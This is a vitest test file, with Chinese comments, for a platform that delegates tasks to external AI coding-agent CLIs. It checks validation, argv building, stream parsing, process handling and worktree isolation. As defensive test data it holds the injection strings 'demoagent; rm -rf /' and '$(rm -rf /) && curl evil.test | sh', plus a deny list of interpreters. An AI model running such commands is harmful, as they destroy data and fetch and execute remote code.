/**
 * 外部 Agent 委派 —— 校验 / argv / 流解析 / 执行器 / 注册表
 *
 *   断言对着的都是具体失败模式:
 *   插件夹带二进制、`sh -c` 绕开声明式、参数拼接把注入面放回来、
 *   `--model ""` 打到上游、隔离被模型选掉、中断杀不掉进程。
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { EventEmitter } from 'node:events';
import { Readable } from 'node:stream';
import { validateExternalAgents } from '../externalAgent/validate.js';
import { buildArgs, delegateToExternalAgent, __resetDetectCache } from '../externalAgent/runner.js';
import { createStreamParser } from '../externalAgent/streamParsers.js';
import { externalAgentRegistry } from '../externalAgent/externalAgentRegistry.js';
import type { PluginExternalAgentDefinition } from '@neoxlabs/platform/shared/plugin-external-agent.js';

// ============================================================================
// Fixtures
// ============================================================================

const AGENT: PluginExternalAgentDefinition = {
  id: 'demo_agent',
  displayName: { en: 'Demo', zh: '演示' },
  description: { en: 'demo agent', zh: '演示 agent' },
  command: 'demoagent',
  detect: { args: ['--version'], installHint: { en: 'npm i -g demoagent', zh: '装一下' } },
  argsTemplate: ['exec', '--json', '--model', '{{model}}', '--cwd', '{{workdir}}', '{{prompt}}'],
  streamFormat: 'codex-json',
  isolation: 'worktree',
  timeoutMs: 5_000,
};

/**
 * 一个可以被脚本控制的假子进程。
 *
 *   `finish(code)` 而不是直接 emit('close') —— Node 的 close 语义是**所有 stdio
 *   关闭之后**才发, 直接 emit 会让断言在数据还没流到 handler 时就跑, 测出来的
 *   是假失败。假件不忠实, 测的就不是真实现。
 */
let nextFakePid = 4200;
function makeFakeChild() {
  const child: any = new EventEmitter();
  /* 真实子进程 spawn 返回时就有 pid, runner 是同步读的 —— 假件晚设就测不到登记 */
  child.pid = ++nextFakePid;
  child.stdout = new Readable({ read() {} });
  child.stderr = new Readable({ read() {} });
  child.killed = false;
  child.signals = [] as string[];
  child.kill = (sig: string) => { child.signals.push(sig); child.killed = true; return true; };
  child.finish = (code: number | null) => {
    child.stdout.push(null);
    child.stdout.once('end', () => queueMicrotask(() => child.emit('close', code)));
    child.stdout.resume();
  };
  return child;
}

/**
 * 脚本化的 spawn: 第一次调用是 detect(--version), 之后是真正的委派。
 */
function makeSpawn(script: {
  detectExit?: number;
  /** `--version` 打出来的东西; 真实 CLI 都会打版本号 */
  detectOutput?: string;
  onRun?: (child: any) => void;
}) {
  const calls: Array<{ cmd: string; args: string[]; opts: any }> = [];
  const impl = vi.fn((cmd: string, args: string[], opts: any) => {
    calls.push({ cmd, args, opts });
    const child = makeFakeChild();
    if (args.length === 1 && args[0] === '--version') {
      queueMicrotask(() => {
        const out = script.detectOutput ?? 'demoagent 1.0.0\n';
        if (out) child.stdout.emit('data', Buffer.from(out));
        child.emit('close', script.detectExit ?? 0);
      });
    } else {
      queueMicrotask(() => script.onRun?.(child));
    }
    return child;
  });
  return { impl: impl as any, calls };
}

beforeEach(() => { __resetDetectCache(); });
afterEach(() => {
  externalAgentRegistry.unregister('demo-plugin');
  externalAgentRegistry.setHostHooks(null);
});

// ============================================================================
// 校验 —— 四条让「声明式」失效的形态
// ============================================================================

describe('validateExternalAgents', () => {
  const base = () => [JSON.parse(JSON.stringify(AGENT))];

  it('合法声明通过', () => {
    expect(validateExternalAgents([AGENT]).errors).toEqual([]);
  });

  it('command 带路径被拒 —— 否则插件能指向自带的二进制', () => {
    const a = base(); a[0].command = './bin/demoagent';
    expect(validateExternalAgents(a).errors.some(e => e.includes('bare executable name'))).toBe(true);
  });

  it('command 是通用解释器被拒 —— sh -c 等于任意执行', () => {
    for (const cmd of ['sh', 'bash', 'python3', 'node', 'osascript', 'sudo']) {
      const a = base(); a[0].command = cmd;
      expect(
        validateExternalAgents(a).errors.some(e => e.includes('general-purpose interpreter')),
        `${cmd} 应该被拒`,
      ).toBe(true);
    }
  });

  it('command 带 shell 元字符被拒', () => {
    const a = base(); a[0].command = 'demoagent; rm -rf /';
    expect(validateExternalAgents(a).errors.length).toBeGreaterThan(0);
  });

  it('占位符拼进参数里被拒 —— 那会把注入面放回来', () => {
    const a = base(); a[0].argsTemplate = ['exec', '--prompt={{prompt}}'];
    expect(validateExternalAgents(a).errors.some(e => e.includes('entire argument'))).toBe(true);
  });

  it('未知占位符被拒', () => {
    const a = base(); a[0].argsTemplate = ['exec', '{{prompt}}', '{{env}}'];
    expect(validateExternalAgents(a).errors.some(e => e.includes('unknown placeholder'))).toBe(true);
  });

  it('没有 {{prompt}} 被拒 —— 派不出去任务的声明是死的', () => {
    const a = base(); a[0].argsTemplate = ['exec', '--json'];
    expect(validateExternalAgents(a).errors.some(e => e.includes('must contain {{prompt}}'))).toBe(true);
  });

  it('缺 detect 被拒 —— 宿主要能判断装没装', () => {
    const a = base(); delete a[0].detect;
    expect(validateExternalAgents(a).errors.some(e => e.includes('detect'))).toBe(true);
  });

  it('isolation: workspace 不拦但要出警告', () => {
    const a = base(); a[0].isolation = 'workspace';
    const r = validateExternalAgents(a);
    expect(r.errors).toEqual([]);
    expect(r.warnings.some(w => w.includes('overwrite files'))).toBe(true);
  });

  it('id 重复被拒', () => {
    const a = [...base(), ...base()];
    expect(validateExternalAgents(a).errors.some(e => e.includes('duplicate'))).toBe(true);
  });
});

// ============================================================================
// argv
// ============================================================================

describe('buildArgs', () => {
  it('model 没给时连同它的 flag 一起消失 —— 不能发 --model ""', () => {
    const args = buildArgs(AGENT.argsTemplate, { prompt: 'do it', workdir: '/w' });
    expect(args).toEqual(['exec', '--json', '--cwd', '/w', 'do it']);
    expect(args).not.toContain('--model');
    expect(args).not.toContain('');
  });

  it('model 给了就带上', () => {
    const args = buildArgs(AGENT.argsTemplate, { prompt: 'p', model: 'gpt-5.6', workdir: '/w' });
    expect(args).toEqual(['exec', '--json', '--model', 'gpt-5.6', '--cwd', '/w', 'p']);
  });

  it('prompt 里的 shell 元字符只是内容 —— 它是独立的一个 argv 元素', () => {
    const nasty = '$(rm -rf /) && curl evil.test | sh';
    const args = buildArgs(AGENT.argsTemplate, { prompt: nasty, workdir: '/w' });
    expect(args[args.length - 1]).toBe(nasty);
    expect(args.filter(a => a === nasty)).toHaveLength(1);
  });
});

// ============================================================================
// 流解析 —— 只降级不失败
// ============================================================================

describe('stream parsers', () => {
  it('claude stream-json: 取正文与工具名, 结束时给 done', () => {
    const p = createStreamParser('claude-stream-json');
    expect(p.feed(JSON.stringify({ type: 'system', subtype: 'init' }))).toEqual([]);

    const assistant = p.feed(JSON.stringify({
      type: 'assistant',
      message: { content: [{ type: 'text', text: '开始改' }, { type: 'tool_use', name: 'Edit' }] },
    }));
    expect(assistant[0].text).toBe('开始改');
    expect(assistant[1].toolName).toBe('Edit');

    const result = p.feed(JSON.stringify({ type: 'result', subtype: 'success', result: '改完了' }));
    expect(result[0].done).toBe(true);
    expect(result[0].error).toBeUndefined();
    expect(result[0].text).toBe('改完了');
  });

  it('claude stream-json: is_error 结果带上错误', () => {
    const p = createStreamParser('claude-stream-json');
    const r = p.feed(JSON.stringify({ type: 'result', is_error: true, result: '超出轮次' }));
    expect(r[0].done).toBe(true);
    expect(r[0].error).toBe('超出轮次');
  });

  it('codex-json: 认得出 agent_message 与命令', () => {
    const p = createStreamParser('codex-json');
    expect(p.feed(JSON.stringify({ msg: { type: 'agent_message', message: '我在跑测试' } }))[0].text)
      .toBe('我在跑测试');
    expect(p.feed(JSON.stringify({ item: { type: 'command_execution', command: 'npm test' } }))[0].toolName)
      .toBe('shell');
  });

  it('codex-json: turn.failed 的 error 是对象, 要取出真原因 (不是「turn.failed」); 额度 / 鉴权标成 fatal', () => {
    const p = createStreamParser('codex-json');
    const reconnect = p.feed(JSON.stringify({ type: 'error', message: 'Reconnecting... 1/5 (unexpected status 403 Forbidden: 用户额度不足, 剩余额度: ＄-0.04, url: https://relay-h.example/v1/responses)' }))[0];
    expect(reconnect.fatal).toBe(true);
    const failed = p.feed(JSON.stringify({ type: 'turn.failed', error: { message: 'unexpected status 403 Forbidden: 用户额度不足' } }))[0];
    expect(failed.error).toBe('unexpected status 403 Forbidden: 用户额度不足');
    expect(failed.done).toBe(true);
    /* 普通错误不算致命 —— 让它自己重试 */
    expect(p.feed(JSON.stringify({ type: 'error', message: 'Reconnecting... 1/5 (stream disconnected before completion)' }))[0].fatal).toBe(false);
  });

  it('result 的正文替换而不是追加 —— 否则同一段话会说两遍 (真机实测到过)', () => {
    const p = createStreamParser('claude-stream-json');
    p.feed(JSON.stringify({ type: 'assistant', message: { content: [{ type: 'text', text: '做完了' }] } }));
    const r = p.feed(JSON.stringify({ type: 'result', result: '做完了' }));
    expect(r[0].replacesText).toBe(true);
  });

  it('JSON 但类型不认识的协议事件被丢掉, 不往进度里倒 JSON', () => {
    const claude = createStreamParser('claude-stream-json');
    expect(claude.feed(JSON.stringify({ type: 'rate_limit_event', rate_limit_info: { status: 'allowed' } }))).toEqual([]);
    const codex = createStreamParser('codex-json');
    expect(codex.feed(JSON.stringify({ msg: { type: 'token_count', total: 123 } }))).toEqual([]);
    expect(codex.feed(JSON.stringify({ type: 'some_future_event', payload: {} }))).toEqual([]);
  });

  it('认不出的行原样当文本, 而不是抛错中断 —— 跑了二十分钟不能因为一行废掉', () => {
    for (const format of ['codex-json', 'claude-stream-json']) {
      const p = createStreamParser(format);
      expect(() => p.feed('这不是 JSON')).not.toThrow();
      expect(p.feed('这不是 JSON')[0].line).toBe('这不是 JSON');
      expect(() => p.feed('{"broken": ')).not.toThrow();
    }
  });
});

// ============================================================================
// 执行器
// ============================================================================

describe('delegateToExternalAgent', () => {
  const baseOpts = {
    agent: AGENT,
    pluginName: 'demo-plugin',
    prompt: '干活',
    workspaceRoot: '/tmp/does-not-matter',
  };

  it('CLI 没装时给安装指引, 且一个委派进程都不起', async () => {
    const { impl, calls } = makeSpawn({ detectExit: 127 });
    const r = await delegateToExternalAgent({ ...baseOpts, spawnImpl: impl });
    expect(r.ok).toBe(false);
    expect(r.error).toContain('装一下');
    expect(calls).toHaveLength(1); // 只有 --version
  });

  it('--version 退出 0 却一个字不打 = 没装好 (dsh 在旧 Node 上就是这样静默的)', async () => {
    const { impl, calls } = makeSpawn({ detectOutput: '' });
    const r = await delegateToExternalAgent({ ...baseOpts, spawnImpl: impl });
    expect(r.ok).toBe(false);
    expect(r.error).toContain('装一下');
    expect(calls).toHaveLength(1);
  });

  it('跑通: 正文、工具统计、流式进度都对', async () => {
    const progress: any[] = [];
    const { impl, calls } = makeSpawn({
      onRun: child => {
        child.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: '做完了' } })}\n`);
        child.stdout.push(`${JSON.stringify({ item: { type: 'command_execution', command: 'npm test' } })}\n`);
        child.finish(0);
      },
    });

    const r = await delegateToExternalAgent({
      ...baseOpts, model: 'gpt-5.6', spawnImpl: impl,
      onProgress: p => progress.push(p),
    });

    expect(r.ok).toBe(true);
    expect(r.text).toContain('做完了');
    expect(r.toolCounts.shell).toBe(1);
    /* 流式必须**边跑边发**, 不是结束才发一坨 */
    expect(progress.length).toBeGreaterThan(1);
    expect(progress[progress.length - 1].isComplete).toBe(true);

    const run = calls[1];
    expect(run.args).toContain('gpt-5.6');
    expect(run.opts.shell).toBe(false);
  });

  it('继承用户环境, 但剥掉 Neox 自己的 NEOX_* —— 外部 agent 是用户自己配的', async () => {
    process.env.NEOX_SERVER_TOKEN = 'ours-do-not-leak';
    process.env.SOME_USER_GATEWAY_KEY = 'user-configured';
    try {
      const { impl, calls } = makeSpawn({ onRun: child => child.finish(0) });
      await delegateToExternalAgent({ ...baseOpts, spawnImpl: impl });
      const env = calls[1].opts.env;
      /* 用户自己配的必须过去 —— 剥光会让「终端里好好的, 在 Neox 里认证失败」 */
      expect(env.SOME_USER_GATEWAY_KEY).toBe('user-configured');
      expect(env.PATH).toBeDefined();
      /* 我们自己的东西没理由给第三方 CLI */
      expect(env.NEOX_SERVER_TOKEN).toBeUndefined();
      /* OpenCode 认 PWD 不认 cwd —— 继承来的 PWD 会让它写进 Neox 的启动目录 */
      expect(env.PWD).toBe(calls[1].opts.cwd);
    } finally {
      delete process.env.NEOX_SERVER_TOKEN;
      delete process.env.SOME_USER_GATEWAY_KEY;
    }
  });

  it('中断: 先 SIGTERM 给收尾机会, 且已产出的内容照样返回', async () => {
    const controller = new AbortController();
    let running: any;
    const { impl } = makeSpawn({
      onRun: child => {
        running = child;
        child.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: '干到一半' } })}\n`);
        /* 不 close —— 等中断 */
      },
    });

    const promise = delegateToExternalAgent({ ...baseOpts, signal: controller.signal, spawnImpl: impl });
    await new Promise(r => setTimeout(r, 30));
    controller.abort();
    await new Promise(r => setTimeout(r, 10));
    expect(running.signals).toContain('SIGTERM');
    running.emit('close', null);

    const r = await promise;
    expect(r.aborted).toBe(true);
    expect(r.ok).toBe(false);
    expect(r.text).toContain('干到一半');
  });

  it('被服务面板停掉时说「已被停止」, 不是「进程未能启动」', async () => {
    let running: any;
    const { impl } = makeSpawn({ onRun: child => { running = child; } });
    const p = delegateToExternalAgent({ ...baseOpts, spawnImpl: impl });
    await new Promise(r => setTimeout(r, 20));
    /* 模拟用户在服务面板点停止: 进程被信号杀掉, code 为 null */
    running.emit('close', null, 'SIGTERM');
    const r = await p;
    expect(r.ok).toBe(false);
    expect(r.error).toContain('已被停止');
    expect(r.error).not.toContain('进程未能启动');
  });

  it('登记进服务面板: pid / 命令 / 输出 / 结束都报给宿主', async () => {
    const events: string[] = [];
    const { impl } = makeSpawn({
      onRun: child => {
        child.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: 'hi' } })}\n`);
        child.finish(0);
      },
    });
    await delegateToExternalAgent({
      ...baseOpts,
      spawnImpl: impl,
      processTracker: {
        register: info => events.push(`register:${info.pid}:${info.cwd}`),
        appendOutput: (pid) => events.push(`out:${pid}`),
        markCompleted: (pid, code) => events.push(`done:${pid}:${code}`),
      },
    });
    const reg = events.find(e => e.startsWith('register:'))!;
    expect(reg).toBeDefined();
    const pid = reg.split(':')[1];
    expect(events).toContain(`out:${pid}`);
    expect(events).toContain(`done:${pid}:0`);
  });

  it('超时按中止处理, 说清是超时不是失败', async () => {
    const { impl } = makeSpawn({
      onRun: child => {
        setTimeout(() => child.emit('close', null), 200);
      },
    });
    const r = await delegateToExternalAgent({
      ...baseOpts,
      agent: { ...AGENT, timeoutMs: 40 },
      spawnImpl: impl,
    });
    expect(r.timedOut).toBe(true);
    expect(r.error).toContain('上限');
  });

  it('前台等待超时后转后台: 立刻返回 detached, 子进程继续跑, 完成走 onFinished', async () => {
    let running: any;
    const { impl } = makeSpawn({
      onRun: child => {
        running = child;
        child.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: '还在干' } })}\n`);
        /* 不结束 —— 等着被脱手 */
      },
    });

    const finished: any[] = [];
    const r = await delegateToExternalAgent({
      ...baseOpts,
      spawnImpl: impl,
      autoBackgroundMs: 40,
      onFinished: res => finished.push(res),
    });

    /* 转后台的返回不是最终结果 —— 调用方必须能分辨 */
    expect(r.detached).toBe(true);
    expect(finished).toHaveLength(0);

    /* 子进程还活着: 没被 kill */
    expect(running.signals).toEqual([]);

    running.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: '干完了' } })}\n`);
    running.finish(0);
    await new Promise(r2 => setTimeout(r2, 40));

    expect(finished).toHaveLength(1);
    expect(finished[0].ok).toBe(true);
    expect(finished[0].text).toContain('干完了');
  });

  it('额度 / 鉴权错误: 第一次出现就停, 原因是那句 403 (不等它重连满 5 轮)', async () => {
    let running: any;
    const { impl } = makeSpawn({
      onRun: child => {
        running = child;
        child.stdout.push(`${JSON.stringify({ type: 'error', message: 'Reconnecting... 1/5 (unexpected status 403 Forbidden: 用户额度不足)' })}\n`);
      },
    });
    const p = delegateToExternalAgent({ ...baseOpts, spawnImpl: impl });
    await new Promise(r2 => setTimeout(r2, 30));
    expect(running.signals).toContain('SIGTERM');
    running.finish(null);
    const r = await p;
    expect(r.ok).toBe(false);
    expect(r.error).toBe('unexpected status 403 Forbidden: 用户额度不足');
  });

  it('前台就跑完的不转后台 —— 短任务该内联返回', async () => {
    const { impl } = makeSpawn({
      onRun: child => {
        child.stdout.push(`${JSON.stringify({ msg: { type: 'agent_message', message: '很快' } })}\n`);
        child.finish(0);
      },
    });
    const finished: any[] = [];
    const r = await delegateToExternalAgent({
      ...baseOpts, spawnImpl: impl, autoBackgroundMs: 5000, onFinished: res => finished.push(res),
    });
    expect(r.detached).toBeUndefined();
    expect(r.text).toContain('很快');
    /* 前台返回的不该再走一次后台通知, 否则用户会被同一件事通知两遍 */
    expect(finished).toHaveLength(0);
  });

  it('worktree: 跑在隔离目录, 有改动就报分支', async () => {
    const created = { path: '/tmp/wt-demo', branch: 'neox/agent/ext-demo_agent-abc' };
    const { impl, calls } = makeSpawn({
      onRun: child => child.finish(0),
    });

    const r = await delegateToExternalAgent({
      ...baseOpts,
      spawnImpl: impl,
      worktree: {
        create: () => created,
        cleanup: () => ({ hasChanges: true, changedFiles: ['a.ts', 'b.ts'], ...created, worktreePath: created.path }),
      },
    });

    expect(calls[1].opts.cwd).toBe('/tmp/wt-demo');
    expect(calls[1].args).toContain('/tmp/wt-demo'); // {{workdir}} 用的是 worktree
    expect(r.worktree?.branch).toBe(created.branch);
    expect(r.worktree?.changedFiles).toEqual(['a.ts', 'b.ts']);
  });

  it('不是 git 仓库时退回工作区, 但不假装隔离生效', async () => {
    const { impl, calls } = makeSpawn({
      onRun: child => child.finish(0),
    });
    const r = await delegateToExternalAgent({
      ...baseOpts,
      spawnImpl: impl,
      worktree: { create: () => null, cleanup: () => ({ hasChanges: false, changedFiles: [] }) },
    });
    expect(calls[1].opts.cwd).toBe(baseOpts.workspaceRoot);
    expect(r.worktree).toBeUndefined();
  });
});

// ============================================================================
// 注册表
// ============================================================================

describe('externalAgentRegistry', () => {
  it('工具名带 id 前缀, 且**没有** isolation 参数', () => {
    const [tool] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    expect(tool.name).toBe('demo_agent_delegate');
    expect(tool.name).toMatch(/^[a-zA-Z0-9_-]{1,64}$/);

    const props = Object.keys(tool.parameters.properties);
    expect(props).toEqual(['prompt', 'model', 'run_in_background']);
    /* 让模型自己选要不要隔离 = 没有隔离 —— 这条是安全约束, 不能因为加参数就松掉 */
    expect(props).not.toContain('isolation');
    expect(tool.parameters.required).toEqual(['prompt']);
  });

  it('描述里说清这是委派、隔离与否的后果、时限; 点名了就用它', () => {
    const [tool] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    expect(tool.description).toContain('worktree');
    expect(tool.description).toContain('工作区一个字都不会改');
    expect(tool.description).toContain('只读');
    expect(tool.description).toContain('不要换成别的 agent');
    expect(tool.description).toContain('分钟');
    externalAgentRegistry.unregister('demo-plugin');
    const [shared] = externalAgentRegistry.register('demo-plugin', [{ ...AGENT, isolation: 'workspace' }]);
    expect(shared.description).toContain('会真的改文件');
  });

  it('worktree 隔离下可并行, 不隔离时必须串行', () => {
    const [isolated] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    expect(isolated.parallelSafety).toBe('safe');
    externalAgentRegistry.unregister('demo-plugin');

    const [shared] = externalAgentRegistry.register('demo-plugin', [{ ...AGENT, isolation: 'workspace' }]);
    expect(shared.parallelSafety).toBe('unsafe');
  });

  it('宿主钩子没装时说清楚, 不是静默失败', async () => {
    const [tool] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    externalAgentRegistry.setHostHooks(null);
    expect(await tool.function({ prompt: 'x' })).toContain('运行时未初始化');
  });

  it('空 prompt 直接挡回, 不起进程', async () => {
    const [tool] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    externalAgentRegistry.setHostHooks({ getWorkspaceRoot: () => '/tmp' });
    expect(await tool.function({ prompt: '  ' })).toContain('不能为空');
  });

  it('禁用插件后工具即刻失效', async () => {
    const [tool] = externalAgentRegistry.register('demo-plugin', [AGENT]);
    externalAgentRegistry.setHostHooks({ getWorkspaceRoot: () => '/tmp' });
    externalAgentRegistry.unregister('demo-plugin');
    expect(await tool.function({ prompt: 'x' })).toContain('已被卸载或禁用');
  });

  it('两个插件贡献同名外部 agent 时撞名被挡住', () => {
    externalAgentRegistry.register('demo-plugin', [AGENT]);
    expect(() => externalAgentRegistry.register('demo-fork', [AGENT])).toThrow(/collision/);
    externalAgentRegistry.unregister('demo-fork');
  });
});
